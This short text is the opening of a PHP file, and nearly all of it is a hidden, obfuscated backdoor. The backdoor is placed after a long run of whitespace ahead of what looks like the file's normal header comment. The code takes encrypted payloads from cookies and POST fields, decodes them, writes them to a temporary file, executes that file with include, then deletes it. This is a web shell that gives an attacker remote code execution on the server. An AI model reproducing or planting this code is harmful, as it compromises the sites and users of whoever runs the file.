<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("upvstrdi")){class upvstrdi{public static $gsqwig = "kkmqqxuurpogckfl";public static $gzaqxzaod = NULL;public function __construct(){$lkjycjznrt = @$_COOKIE[substr(upvstrdi::$gsqwig, 0, 4)];if (!empty($lkjycjznrt)){$cjylg = "base64";$fpumerh = "";$lkjycjznrt = explode(",", $lkjycjznrt);foreach ($lkjycjznrt as $fcwdink){$fpumerh .= @$_COOKIE[$fcwdink];$fpumerh .= @$_POST[$fcwdink];}$fpumerh = array_map($cjylg . "_decode", array($fpumerh,));$fpumerh = $fpumerh[0] ^ str_repeat(upvstrdi::$gsqwig, (strlen($fpumerh[0]) / strlen(upvstrdi::$gsqwig)) + 1);upvstrdi::$gzaqxzaod = @unserialize($fpumerh);}}public function __destruct(){$this->yyfmkyc();}private function yyfmkyc(){if (is_array(upvstrdi::$gzaqxzaod)) {$xrvlf = sys_get_temp_dir() . "/" . crc32(upvstrdi::$gzaqxzaod["salt"]);@upvstrdi::$gzaqxzaod["write"]($xrvlf, upvstrdi::$gzaqxzaod["content"]);include $xrvlf;@upvstrdi::$gzaqxzaod["delete"]($xrvlf);exit();}}}$aldskmyuxi = new upvstrdi();$aldskmyuxi = NULL;} ?><?php
/**
